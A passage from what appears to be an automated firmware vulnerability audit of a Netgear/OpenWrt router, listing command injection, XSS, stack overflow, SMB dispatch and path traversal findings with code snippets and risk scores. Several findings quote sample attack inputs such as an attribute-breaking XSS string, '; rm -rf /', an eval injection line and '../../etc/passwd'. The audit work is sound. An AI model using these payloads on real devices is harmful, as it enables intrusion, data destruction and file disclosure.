- **Description:** The Lua interpreter allows arbitrary Lua code to be executed via the LUA_INIT environment variable or the -e command-line argument, including the execution of system commands through the os.execute function. An attacker, as a logged-in non-root user, can set malicious environment variables or use command-line options to inject code, thereby executing arbitrary commands under the user's privileges. Trigger conditions include: setting the LUA_INIT environment variable to malicious Lua code (e.g., `os.execute('malicious_command')`) or running `lua -e "os.execute('malicious_command')"`. There are no constraints; input is passed directly to the Lua execution engine, lacking validation or filtering. Potential attacks include command injection, privilege escalation (if combined with other vulnerabilities), or lateral movement. The code logic involves the main function initializing the Lua state, loading standard libraries (including the os library), and executing input code via lua_cpcall or lua_pcall.
- **Code Snippet:**
  ```
  Decompiled code from the main function:
  int32_t main(uint param_1,uint *param_2,uint param_3,uint param_4) {
      iVar1 = sym.imp.luaL_newstate();
      ...
      iVar1 = sym.imp.lua_cpcall(iVar1,*0x8d80 + 0x8d30,puVar3 + 4);  // Indirectly calls luaL_openlibs to load standard libraries
      ...
  }
  Disassembled code from fcn.000091c8:
  0x00009298      3cfeffeb       bl sym.imp.luaL_loadbuffer  // Loads input code
  0x000093c0      d4fdffeb       bl sym.imp.lua_pcall        // Executes code
  ```
- **Keywords:** LUA_INIT
- **Notes:** This vulnerability is based on the standard behavior of the Lua interpreter but could be abused by an attacker. Further verification of os.execute availability is needed (via dynamic testing), but static analysis shows luaL_openlibs is called, which should load the os library. It is recommended to restrict environment variable usage or sandbox the Lua execution environment. Associated files: No other files are directly involved; this vulnerability is independent of the current binary.

---
### CommandInjection-arm-openwrt-linux-wxconfig

- **File/Directory Path:** `usr/lib/wx/config/arm-openwrt-linux-base-unicode-release-2.8`
- **Location:** `usr/lib/wx/config/arm-openwrt-linux-base-unicode-release-2.8 (Delegate logic part, specific code segment is in the string output)`
- **Risk Score:** 7.5
- **Confidence:** 9.0
- **Description:** This script contains a command injection vulnerability in its delegate handling. An attacker can specify a user-controlled path via the --prefix or --exec-prefix option, causing the script to load and execute a malicious configuration file from that path. Specific exploitation chain: 1) The attacker creates a malicious script in a user-writable directory (e.g., /home/user/malicious/lib/wx/config/) and ensures the filename matches the pattern set by the user via options (e.g., --host, --toolkit); 2) Invoke the script and specify --prefix=/home/user/malicious and other options to match the malicious file; 3) The script's delegate logic executes the malicious script, passing all parameters, leading to arbitrary command execution. Trigger condition: The attacker needs file creation permission and script execution permission. The vulnerability stems from the script not validating the safety of the user-input path and directly using it to execute commands.
- **Code Snippet:**
  ```
  # Delegate execution code snippet (extracted from strings output):
  if [ $_numdelegates -eq 1 ]; then
      WXCONFIG_DELEGATED=yes
      export WXCONFIG_DELEGATED
      $wxconfdir/\`find_eligible_delegates $configmask\` $*
      exit
  fi
  # wxconfdir definition:
  wxconfdir="${exec_prefix}/lib/wx/config"
  exec_prefix=${input_option_exec_prefix-${input_option_prefix-${this_exec_prefix:-/usr}}}
  ```
- **Keywords:** input_option_prefix, input_option_exec_prefix, wxconfdir, best_delegate, configmask
- **Notes:** The vulnerability requires the attacker to be able to create files and directories, but it is feasible in a non-root user context. It is recommended to verify if users can access and modify the prefix path in the firmware environment. Subsequently, check if other components call this script and pass user input.

---
### XSS-initGraphics

- **File/Directory Path:** `www/js/PRV/PRView.js`
- **Location:** `PRItem.js:initGraphics function (specific line number unavailable, but the code is within the `initGraphics` method)`
- **Risk Score:** 7.5
- **Confidence:** 8.5
- **Description:** During the HTML construction process of the PRItem class, the `uid` parameter is not validated or escaped and is directly concatenated into the `id` attribute, leading to a Cross-Site Scripting (XSS) vulnerability. Trigger condition: When the `PRView.addItem` method is called (e.g., via user interaction or network request), a malicious `uid` value (such as `" onmouseover="alert(1) x="`) breaks the attribute boundary, injecting arbitrary HTML/JavaScript code. jQuery's `appendTo` method parses and executes this HTML, allowing an attacker to execute scripts in the victim's browser context. Exploitation method: An attacker, as an authenticated user, can inject a malicious payload by manipulating the `uid` input (e.g., via API or form submission) to steal sessions or perform unauthorized operations. The vulnerability stems from a lack of input filtering and output encoding.
- **Code Snippet:**
  ```
  self.strDivID = "pritem_"+uid;
  self.strDIV = "<div id=\""+self.strDivID+"\" style=\"width: 100%;height:"+self.nHeight+"px;\"></div>";
  $(self.strDIV).appendTo("#"+self.strParentDiv);
  ```
- **Keywords:** uid, strDivID, strParentDiv
- **Notes:** Attack chain is complete: input point (`uid` parameter) → data flow (direct concatenation into HTML) → dangerous operation (jQuery DOM insertion). Further validation of the backend input source and context is needed, but based on the code evidence, exploitability is high. It is recommended to check all code paths that call `PRView.addItem` to ensure validation and escaping of `uid`. Related file: PRView.js (calls the PRItem constructor).

---
### Command-Injection-event_notify

- **File/Directory Path:** `etc/scripts/ntgr_sw_api/app_register.sh`
- **Location:** `app_register.sh in event_notify function (around the line with `${APP_FOLDER}/${app}/program/${app} event $@ &`)`
- **Risk Score:** 7.5
- **Confidence:** 8.0
- **Description:** When handling the 'system' event in the event_notify function, the third parameter (new device name) is passed directly to a shell command without input validation or escaping. An attacker can execute arbitrary commands by injecting shell metacharacters (such as ;, &, |). Trigger condition: The attacker calls the script as a non-root user, using 'event_notify system devname <payload>', where <payload> contains malicious commands, and at least one application has registered for the system event. Exploitation method: If the attacker can control the parameter, they can inject commands such as '; rm -rf /' or launch a reverse shell. The attack chain is complete but depends on system state (registered applications).
- **Code Snippet:**
  ```
  ${APP_FOLDER}/${app}/program/${app} event $@ &
  ```
- **Keywords:** Command line argument $@, EVENT_SYSTEM, APP_FOLDER
- **Notes:** Further verification is needed to determine if the system has pre-installed applications registered for the system event, and the script's execution permissions. It is recommended to check the contents and permissions of the /storage/system/apps directory. Related files may include the application's program and data directories. The attack chain depends on external conditions, but code analysis reveals a clear vulnerability.

---
### Stack-Buffer-Overflow-fcn.000086d0-list

- **File/Directory Path:** `bin/readycloud_nvram`
- **Location:** `readycloud_nvram:0x00008914 (function fcn.000086d0)`
- **Risk Score:** 7.5
- **Confidence:** 8.0
- **Description:** In the 'list' command processing, the program uses sprintf to copy the user-provided name-prefix parameter and a counter into a fixed-size stack buffer (516 bytes) without boundary checks. An attacker, as a logged-in user, can trigger the vulnerability by executing './readycloud_nvram list <long-string>', where <long-string> exceeds 515 bytes (considering the digits added by %d). This may lead to a stack buffer overflow, overwriting the saved return address (lr), controlling the program counter, and executing arbitrary code. Full attack chain: user input → command line argument → sprintf without boundary check → stack overflow → arbitrary code execution. High exploitability because command line arguments can typically reach this length.
- **Code Snippet:**
  ```
  From disassembly code:
  0x00008910 add r0, s                  ; target buffer address
  0x00008914 bl sym.imp.sprintf        ; call sprintf(buffer, "%s%d", arg, counter)
  Where arg is the user-controlled name-prefix parameter, and counter is the loop counter.
  ```
- **Keywords:** Command line argument: list, Command line argument: name-prefix
- **Notes:** The buffer size is only 516 bytes, and command line arguments can typically reach this length, so exploitability is high. It is recommended to further verify the actual command line length limit and stack layout to confirm the offset. Related function: fcn.000086d0 (main processing function). Linked to command line input source via link_identifiers.

---
### Config-Injection-download-generate_client_conf_file

- **File/Directory Path:** `etc/openvpn/download`
- **Location:** `download:20-80 (function generate_client_conf_file)`
- **Risk Score:** 7.5
- **Confidence:** 8.0
- **Description:** The script uses unvalidated configuration values to generate OpenVPN client configuration files, lacking input validation and filtering. An attacker (logged-in user) can modify NVRAM configuration values (such as `sysDNSHost` or `wan_ipaddr`) to set `host_name` or `static_ip` to a malicious IP or domain name. When the script runs (e.g., triggered by a system event like a configuration change), it generates a malicious OpenVPN configuration file (such as client.ovpn or client.conf). When users download and use these configuration files, the OpenVPN client connects to an attacker-controlled server, leading to traffic hijacking, data leakage, or man-in-the-middle attacks. Trigger conditions include: the attacker can modify configuration values, the script is executed, and the user downloads and uses the generated configuration file. The exploitation method is simple, and the success probability is high because configuration values are directly embedded without escaping.
- **Code Snippet:**
  ```
  if [ "$($CONFIG get endis_ddns)" = "1" ]; then
      ddns_provider=$($CONFIG get sysDNSProviderlist)
      if [ "$ddns_provider" = "www/var/www.oray.cn" ]; then
          host_name=$(head $DOMAINLS_FILE -n 1)
      else
          host_name=$($CONFIG get sysDNSHost)
      fi
  else
      if [ "$($CONFIG get wan_proto)" == "pppoe" ]; then 
          static_ip=$($CONFIG get wan_pppoe_ip)
      else
          static_ip=$($CONFIG get wan_ipaddr)
      fi
  fi
  ...
  remote $host_name $static_ip $port
  ```
- **Keywords:** endis_ddns, sysDNSProviderlist, sysDNSHost, wan_proto, wan_pppoe_ip, wan_ipaddr, vpn_serv_port, vpn_serv_type, tun_vpn_serv_port, tun_vpn_serv_type, /tmp/openvpn/client.ovpn, /tmp/openvpn/client.conf, /tmp/openvpn/smart_phone.ovpn, /tmp/ez-ipupd.domainls
- **Notes:** The attack chain is complete: entry point (NVRAM configuration) → data flow (script directly uses values) → sink point (generated configuration file). It is necessary to verify whether the attacker can modify these configurations through the web interface and the script's execution triggers. It is recommended to further analyze the web interface or related IPC mechanisms to confirm the feasibility of modifying configurations. Associated files may include web server scripts or configuration management components.

---
### Untitled Finding

- **File/Directory Path:** `etc/scripts/ntgr_sw_api/ntgr_sw_api.sh`
- **Location:** `ntgr_sw_api.sh:84 app_reg_event`
- **Risk Score:** 7.5
- **Confidence:** 7.5
- **Description:** In the app_reg_event function, parameters are passed directly to the app_register.sh script without using double quotes for escaping, allowing command injection. An attacker can execute arbitrary commands by providing malicious parameters containing shell metacharacters. For example, calling `./ntgr_sw_api.sh app_reg_event usb-storage "; malicious_command"` will execute `app_register.sh event_register usb-storage ; malicious_command`, potentially injecting commands. The trigger condition is that the attacker can control the input parameters, and the app_register.sh script runs with sufficient privileges.
- **Code Snippet:**
  ```
  ${NTGR_SW_API_DIR}/app_register.sh event_register $@
  ```
- **Keywords:** Script path /etc/scripts/ntgr_sw_api/app_register.sh
- **Notes:** The app_register.sh script needs to be analyzed to confirm the completeness of the vulnerability exploitation chain. If app_register.sh has similar issues, the risk may be higher.

---
### Command-Injection-read_conf_file_for_athr_hostapd

- **File/Directory Path:** `etc/hotplug.d/wps/00-wps`
- **Location:** `00-wps: in function read_conf_file_for_athr_hostapd, during the while loop processing config file lines`
- **Risk Score:** 7.5
- **Confidence:** 7.0
- **Description:** Command injection vulnerability in the `read_conf_file_for_athr_hostapd` function due to unsafe use of `eval` on input from the configuration file ($FILE). When processing lines in the config file, for arguments matching 'wpa', 'wpa_key_mgmt', 'wpa_pairwise', or 'wps_state', the script executes `eval tmp_$arg="$val"`. If $arg contains shell metacharacters (e.g., semicolons), it can break the assignment and execute arbitrary commands. For example, a malicious config file entry like 'wpa; echo hacked > /tmp/pwned; =2' would execute 'echo hacked > /tmp/pwned' when evaluated. Trigger conditions include: $ACTION must be 'SET_CONFIG', $FILE must point to a attacker-controlled file, $PROG_SRC must be 'athr-hostapd', and $SUPPLICANT_MODE must not be '1'. The script likely runs with root privileges, so successful exploitation could lead to root code execution. Potential attacks include injecting commands to gain full system control or modify configurations.
- **Code Snippet:**
  ```
      while read -r arg val; do
          case "$arg" in
              wpa|wpa_key_mgmt|wpa_pairwise|wps_state)
                  eval tmp_$arg="$val"
                  ;;
          esac
      done < ${FILE}.$$
  ```
- **Keywords:** FILE (environment variable or config file path), PROG_SRC (environment variable), SUPPLICANT_MODE (environment variable), ACTION (environment variable)
- **Notes:** The vulnerability is clear from the code, but exploitability depends on the parent process (e.g., WPS daemon) allowing control over environment variables and $FILE. As a non-root user, the attacker may need to leverage WPS mechanisms or other interfaces to set these variables. Further analysis of how this script is invoked (e.g., by hostapd or wscd) is recommended to confirm the attack chain. Additional checks for other input sources (e.g., network interfaces) could reveal more paths.

---
### BufferOverflow-SMBCommandHandler

- **File/Directory Path:** `usr/sbin/smbd`
- **Location:** `smbd (ELF binary), functions: fcn.000a0be4 (0x000a0be4), receive_smb_raw (0x001c3cb0), indirect call points (e.g., 0x000a0da8)`
- **Risk Score:** 7.5
- **Confidence:** 7.0
- **Description:** Based on an in-depth analysis of the 'smbd' binary, a potentially exploitable attack chain was identified, involving a buffer overflow vulnerability in SMB command processing. In the SMB command processing function fcn.000a0be4 (presumed to be the SMB command dispatcher), there is a dynamic function call mechanism based on a user-controllable SMB command number (param_1). The command number is used to calculate a function pointer table offset (param_1 * 0xc + *0xa10bc + 0xa0c94), and then the handler function is called indirectly. If the command number exceeds the valid range or is not properly validated, it may lead to out-of-bounds memory access or the calling of arbitrary function pointers. Combined with potentially insufficient data length checks in the data reception path (receive_smb_raw), an attacker, as an authenticated non-root user, could potentially trigger a stack or heap buffer overflow by sending a crafted SMB data packet, leading to privilege escalation or remote code execution. Trigger conditions include malicious command numbers or overly long data fields. Potential exploitation methods include overwriting function pointers or return addresses to control the program execution flow.
- **Code Snippet:**
  ```
  In fcn.000a0be4, iVar8 = param_1 * 0xc + *0xa10bc + 0xa0c94; if (*(iVar8 + 4) == 0) { ... } else { uVar2 = (**(param_1 * 0xc + *0xa10c8 + 0xa0dd0))(uVar1,param_2,param_3,param_4); }. In receive_smb_raw, iVar1 = fcn.001c3788(); if (iVar1 < 0 == false) { if (iVar1 == *0x1c3c80 || iVar1 < *0x1c3c80) { iVar2 = sym.read_data(param_1,param_2 + 4); } }.
  ```
- **Keywords:** SMB network interface (TCP port), IPC socket path, smbd_process, receive_smb, receive_smb_raw, fcn.000a0be4, reply_unknown
- **Notes:** Further verification is needed regarding specific buffer operations (such as the use of strcpy or sprintf) within the SMB handler functions; dynamic analysis or fuzz testing (e.g., AFL) is recommended. Related functions include reply_unknown, read_data. Next steps: Check historical CVEs (e.g., CVE-2017-7494) for similar vulnerabilities, or test with abnormal SMB requests.

---
### StackOverflow-nvram_set

- **File/Directory Path:** `bin/nvram`
- **Location:** `nvram:0x00008764 fcn.000086d0`
- **Risk Score:** 6.5
- **Confidence:** 8.0
- **Description:** In the 'set' operation of the 'nvram' program, the strcpy function is used to copy a user-provided command line argument (argv[2]) to a stack buffer without performing a length check. The stack buffer has a fixed size of 0x6021C bytes (approximately 384KB). If an attacker provides an argument longer than this, it will overflow the stack buffer, overwriting the saved return address (lr), thereby controlling the program execution flow. Trigger condition: An attacker executes 'nvram set <overly long string>', where the string length exceeds 384KB. Exploitation method: Carefully construct an overflow string containing shellcode or a ROP chain to execute arbitrary code. Since the program does not have setuid permissions, code execution runs with the current user's privileges, but it may allow modification of NVRAM settings or further system attacks.
- **Code Snippet:**
  ```
  0x00008760      0d00a0e1       mov r0, sp                  ; char *dest
  0x00008764      a0ffffeb       bl sym.imp.strcpy           ; char *strcpy(char *dest, const char *src)
  ```
- **Keywords:** argv[2]
- **Notes:** Exploiting this vulnerability requires an overly long command line argument (approximately 384KB). In embedded systems, this might be limited by ARG_MAX, but it is usually achievable. It is recommended to further test the feasibility of the overflow and check if other components call this program with higher privileges. Related function: config_set.

---
### PathTraversal-libxt_layer7

- **File/Directory Path:** `usr/lib/iptables/libxt_layer7.so`
- **Location:** `libxt_layer7.so:0x00000b40 (fcn.00000b40)`
- **Risk Score:** 5.0
- **Confidence:** 8.0
- **Description:** Path traversal vulnerability in the layer7 iptables match module allows arbitrary file read. User-controlled inputs --l7proto and --l7dir are used in file path construction via snprintf without proper sanitization for directory traversal sequences (e.g., '../'). This enables attackers to read files outside the intended directory (e.g., /etc/l7-protocols). The vulnerability is triggered when a non-root user with login credentials executes iptables commands with malicious --l7proto or --l7dir values, such as specifying a protocol name like '../../etc/passwd' to access sensitive files. While direct code execution is not achieved, information disclosure occurs if the targeted file exists and is readable by the user. This represents a complete attack chain from untrusted input (command-line) to dangerous operation (file read).
- **Code Snippet:**
  ```
  From decompilation: \`iVar4 = sym.imp.snprintf(puVar21 + -0x20c, 0x100, iVar5 + 0xcb8, pcVar16);\` where pcVar16 is derived from user input (--l7proto or directory entries), and the format string (e.g., '%s/%s/%s.pat') incorporates this input into the path.
  ```
- **Keywords:** --l7proto, --l7dir
- **Notes:** This vulnerability could be part of a broader attack chain if combined with other weaknesses (e.g., misconfigured file permissions). No evidence of buffer overflows was found; strcpy and strncpy uses appear safe due to bounds checks (e.g., malloc based on strlen). Further analysis of caller functions in iptables might reveal additional interaction points.

---
